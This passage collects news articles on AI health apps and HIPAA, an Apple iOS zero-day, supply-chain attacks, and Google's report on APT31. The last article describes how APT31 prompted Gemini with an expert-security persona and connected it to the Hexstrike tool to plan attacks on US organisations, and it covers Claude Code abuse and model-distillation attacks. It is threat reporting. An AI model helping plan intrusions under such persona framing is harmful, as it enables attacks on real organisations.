Laws like HIPAA require covered entities and their business associates to “maintain reasonable and appropriate administrative, physical, and technical safeguards for the security of certain individually identifiable health information.”

It also subjects companies to breach notification rules that force them to notify victims, the Department of Health and Human Services and in some cases the public when certain health data has been accessed, acquired, used or disclosed in a data breach.

Groome and Andrew Crawford, senior counsel at Center for Democracy and Technology’s Data and Privacy Project, said that tech companies like OpenAI, Anthropic and Google almost certainly would not be considered covered entities under HIPAA’s security rule, which according to HHS applies to health plans, clearinghouses, health care providers and business associates who transfer Electronic Protected Health Information (ePHI).

OpenAI and Anthropic do not claim that ChatGPT Health or Claude for Healthcare follow HIPAA. Anthropic’s web site describes Claude for Healthcare as “built on HIPAA-ready infrastructure,” while OpenAI’s page for its suite of healthcare-related enterprise products claims they “support” HIPAA compliance.OpenAI, Anthropic and Google did not respond to a request for comment from CyberScoop.

That distinction means “that a number of companies not bound by HIPAA’s privacy protections will be collecting, sharing, and using peoples’ health data,” Crawford said in a statement to CyberScoop. “And since it’s up to each company to set the rules for how health data is collected, used, shared, and stored, inadequate data protections and policies can put sensitive health information in real danger.”

Laws like HIPAA contain strong privacy protections for health data but are limited in scope and “meant to help the digitization of records, not stop tech companies from gathering your health data outside of the doctor’s office,” Geoghegan said.

As they expand into healthcare, tech companies like OpenAI, Anthropic, and Google have emphasized data security as a top priority in their product launches.

OpenAI said their health model uses an added layer of built encryption and isolation features to compartmentalize health conversations, as well as added features like multifactor authentication. And, like other OpenAI models, ChatGPT Health encrypts its data at rest and in transit, has a feature to delete chats within 30 days and promises your data won’t be used for AI training.

For uploading medical records, OpenAI said it is partnering with b.well, an AI-powered digital health platform that connects health data for U.S. patients. On its website, the company says “it uses a transparent, consumer-friendly privacy policy that lets users control and change data-sharing permissions at any time, does not sell personal data, and only shares it without permission in limited cases. It also voluntarily follows the CARIN Alliance Trust Framework and Code of Conduct—making it accountable to the FTC—and says it aims to meet or exceed HIPAA standards through measures like encryption, regular security reviews, and HITRUST and NIST CSF certifications, though it notes no system can fully eliminate cyber risk.

Legal experts say that when tech companies promise their AI products are “HIPAA compliant” or “HIPAA ready,” it’s often unclear whether these claims amount to anything more than a promise not to use health data irresponsibly.

These distinctions matter when it comes to personal health data. Geoghegan said it is not uncommon in some corners of the wellness industry for an unregulated business to ambiguously claim they are “HIPAA-compliant” to elude the fact that they aren’t legally bound by the regulations.

“Generally speaking, a lot of companies say they’re HIPAA compliant, but what they mean is that they’re not a HIPAA regulated entity, therefore they have no obligation,” said Geoghegan.

Groome suggested that AI companies are being “hyperbolic” in their commitment to security in an effort to assuage the concerns of privacy critics, noting that their product announcements contain “a comical level of how much they say they’re going to protect your information.”

An added wrinkle is that AI tools remain black boxes in some respects, with even their developers unable to fully understand or explain how they work. That kind of uncertainty, especially with healthcare data, can lead to bad security or privacy outcomes.

“It’s really shaky right now when a company comes out and says ‘we’re fully HIPAA compliant’ and I think what they’re doing is trying to give the consumer a false sense of trust,” said Groome.

Several sources told CyberScoop that despite these risks, they expect AI health apps to continue being widely used, in part because the traditional American healthcare system remains so expensive.

AI tools – by contrast – are convenient, immediate and cost effective. While people like Geoghegan and Groome have said they are sympathetic to the pressures that push people towards these apps, the tradeoffs are troubling.

“A lot of this stems from the fact that care is inaccessible, it’s hard to get and it’s expensive, and there are many reasons why people don’t trust in health care provisions,” said Geoghegan. “But the solution to that care being inaccessible cannot be relying on big tech and billionaire’s products. We just can’t trust [them] to have our best health interest in mind.”

Apple patches decade-old iOS zero-day, possibly exploited by commercial spyware

Flaw abused 'in an extremely sophisticated attack against specific targeted individuals'

Apple patched a zero-day vulnerability affecting every iOS version since 1.0, used in what the company calls an "extremely sophisticated attack" against targeted individuals.

CVE-2026-20700, discovered by Google's Threat Analysis Group, affects dyld - Apple's dynamic linker - and allows attackers with memory write capability to execute arbitrary code. Apple said the flaw was exploited in the wild and may have been part of an exploit chain.

Its advisory stated: "An attacker with memory write capability may be able to execute arbitrary code. Apple is aware of a report that this issue may have been exploited in an extremely sophisticated attack against specific targeted individuals on versions of iOS before iOS 26."

Google's researchers also referenced two December vulnerabilities in their report that both carry 8.8 CVSS scores.

CVE-2025-14174 is an out-of-bounds memory access flaw in Google Chrome's ANGLE graphics engine on Mac that could be exploited through a malicious webpage.

The other, CVE-2025-43529, is a use-after-free leading to code execution.

Brian Milbier, deputy CISO at Huntress, said: "Think of dyld as the doorman for your phone. Every single app that wants to run must first pass through this doorman to be assembled and given permission to start.

"Usually, the doorman checks credentials and places apps in a high-security 'sandbox' where they can't touch your private data. This vulnerability allows an attacker to trick the doorman into handing over a master key before security checks even begin."

By chaining this with WebKit flaws Apple also addressed in the iOS 26.3 update, "attackers have created a 'zero-click' or 'one-click' path to total control. They use a fake ID to bypass the front gate – your browser – and then exploit the doorman's flaw to take over the entire building," Milbier added.

"This level of sophistication resembles other exploits developed by the commercial surveillance industry. These are private companies that also developed prominent spyware tools like Pegasus and Predator. They sell these types of exploits or tools to government clients. While some updates in this patch address minor issues, such as data leakage from physical access, the dyld/WebKit chain is in a different league. iOS 26.3 closes a door that has been unlocked for over a decade."

Apple's updates for iOS and iPadOS also feature a host of other fixes for various bugs, including flaws that grant root access and disclose sensitive user information, but CVE-2026-20700 is the only one it said was exploited in the wild. ®

[26] The Register - Supply chain attacks now fuel a 'self-reinforcing' cybercrime economy

Supply chain attacks now fuel a 'self-reinforcing' cybercrime economy

Researchers say breaches link identity abuse, SaaS compromise, and ransomware into a cascading cycle

Cybercriminals are turning supply chain attacks into an industrial-scale operation, linking breaches, credential theft, and ransomware into a "self-reinforcing" ecosystem, researchers say.

In its latest trends report, Group-IB reckons individual strikes that lead to broader downstream compromises of businesses are now interconnected as cyberbaddies pursue multiple methods to breach vendors and service providers.

Supply chain hacks like the recent Shai-Hulud NPM worm, Salesloft debacle, or the OpenClaw package poisoning are fast becoming the primary goals of the criminal fraternity who try to exploit the inherited access to a victim's customers.

"Open source package compromise feeds malware distribution and credential theft," the research states. "Phishing and OAuth abuse enable identity compromise that unlocks SaaS and CI/CD environments. Data breaches supply the credentials, context, and relationships needed to refine impersonation and lateral movement. Ransomware and extortion arrive later in the chain, capitalizing on access and intelligence gathered earlier. Each stage strengthens the next, creating a self-reinforcing cycle of supply chain exploitation."

Over the next year, GroupIB predicts supply chain attacks will be executed faster thanks to AI-assisted tools that can scan for vulnerabilities across vendors, CI/CD pipelines, and browser extension marketplaces at machine speed.

It also expects to see traditional malware replaced by identity attacks, whereby criminals set themselves up as genuine users and their activity blends into the normal daily business functions, evading detection for longer periods.

Platforms offering HR, CRM, and ERP, as well as MSPs, are high-priority targets, Group-IB says, as a single compromise can lead to hackers gaining access to hundreds of customers.

Evolution of data breaches

The Salesloft breach, as well as the Oracle compromise of March 2025, are examples of how data breaches are shifting from a single-reward model to one where access is used for additional compromises.

Instead of taking one big wedge of data and demanding an extortion payment, criminals took their time to collect OAuth tokens and exploit misconfigured partner connections to move laterally. They then target downstream customers, steal their data and contact lists to repeat the cycle, or, in cases involving NPM and similar ecosystems, serve malicious updates to users to carry out fraud at scale.

"Cybercrime is no longer defined by single breaches. It is defined by cascading failures of trust," said Dmitry Volkov, Group-IB CEO.

"Attackers are industrializing supply chain compromise because it delivers scale, speed, and stealth. A single upstream breach can now ripple across entire industries. Defenders must stop thinking in terms of isolated systems and start securing trust itself, across every relationship, identity, and dependency."

Organizations should treat third parties as extensions of their own attack surface.

"Strategic investments in supply chain threat modeling, automated dependency checks, and data flow visibility are no longer optional – they are foundational to modern security architecture," said Volkov. ®

[27] The Register - Google: China's APT31 used Gemini to plan cyberattacks against US orgs

Google: China's APT31 used Gemini to plan cyberattacks against US orgs

Meanwhile, IP-stealing 'distillation attacks' on the rise

A Chinese government hacking group that has been sanctioned for targeting America's critical infrastructure used Google's AI chatbot, Gemini, to auto-analyze vulnerabilities and plan cyberattacks against US organizations, the company says.

While there's no indication that any of these attacks were successful, "APT groups like this continue to experiment with adopting AI to support semi-autonomous offensive operations," Google Threat Intelligence Group chief analyst John Hultquist told The Register. "We anticipate that China-based actors in particular will continue to build agentic approaches for cyber offensive scale."

In the threat-intel group's most recent AI Threat Tracker report, released on Thursday and shared with The Register in advance, Google attributes this activity to APT31, a Beijing-backed crew also known as Violet Typhoon, Zirconium, and Judgment Panda.

This goon squad was one of many exploiting a series of Microsoft SharePoint bugs over the summer, and in March 2024, the US issued sanctions against and criminally charged seven APT31 members accused of breaking into computer networks, email accounts, and cloud storage belonging to numerous high-value targets.

The most recent attempts by APT31 to use Google's Gemini AI tool happened late last year, we're told.

"APT31 employed a highly structured approach by prompting Gemini with an expert cybersecurity persona to automate the analysis of vulnerabilities and generate targeted testing plans," according to the report.

The adversaries' adoption of this capability is so significant – it's the next shoe to drop

In one case, the China-based gang used Hexstrike, an open source, red-teaming tool built on the Model Context Protocol (MCP) to analyze various exploits - including remote code execution, web application firewall (WAF) bypass techniques, and SQL injection - "against specific US-based targets," the Googlers wrote.

Hexstrike enables models, including Gemini, to execute more than 150 security tools with a slew of capabilities, including network and vulnerability scanning, reconnaissance, and penetration testing. Its intended use is to help ethical hackers and bug hunters find security weaknesses and collect bug bounties – but shortly after its release in mid-August, criminals began using the AI platform for more nefarious purposes.

Moving closer to automated attacks

Integrating Hexstrike with Gemini "automated intelligence gathering to identify technological vulnerabilities and organizational defense weaknesses," the AI threat tracker says, noting that Google has since disabled accounts linked to this campaign. "This activity explicitly blurs the line between a routine security assessment query and a targeted malicious reconnaissance operation."

Google's report, which picks up where its November 2025 analysis left off, details how government-backed groups and cybercriminals alike are abusing Google's AI tools, along with the steps the Chocolate Factory has implemented to stop them. And it finds that attackers - just like everybody else on the planet - have a keen interest in agentic AI's capabilities to make their lives and jobs easier.

"The adversaries' adoption of this capability is so significant - it's the next shoe to drop," Hultquist said.

He explained there are two areas that Google is most concerned about.

"One is the ability to operate across the intrusion," he said, noting the earlier Anthropic report about Chinese cyberspies abusing its Claude Code AI tool to automate most elements of attacks directed at high-profile companies and government organizations. In "a small number of cases," they even succeeded.

"The other is automating the development of vulnerability exploitation," Hultquist said. "These are two ways where adversaries can get major advantages and move through the intrusion cycle with minimal human interference. That allows them to move faster than defenders and hit a lot of targets."

In addition, using AI agents to find vulnerabilities and test exploits widens the patch gap - the time between the bug becoming known and a full working fix being deployed and implemented.

"It's a really significant space currently," Hultquist said. "In some organizations, it takes weeks to put defenses in place."

This requires security professionals to think differently about defense, using AI to respond and fix security weaknesses more quickly than humans can on their own.

"We are going to have to leverage the advantages of AI, and increasingly remove humans from the loop, so that we can respond at machine speed," Hultquist noted.

The latest report also found an increase in model extraction attempts - what it calls "distillation attacks" - and says both GTIG and Google DeepMind identified miscreants attempting to perform model extraction on Google's AI products. This is a type of intellectual property theft used to gain insights into a model's underlying reasoning and chain-of-thought processes.

"This is coming from threat actors throughout the globe," Hultquist said. "Your model is really valuable IP, and if you can distill the logic behind it, there's very real potential that you can replicate that technology – which is not inexpensive."

This essentially gives criminals and shady companies the ability to accelerate AI model development at a much lower cost, and Google's report cites "model stealing and capability extraction emanating from researchers and private sector companies globally." ®
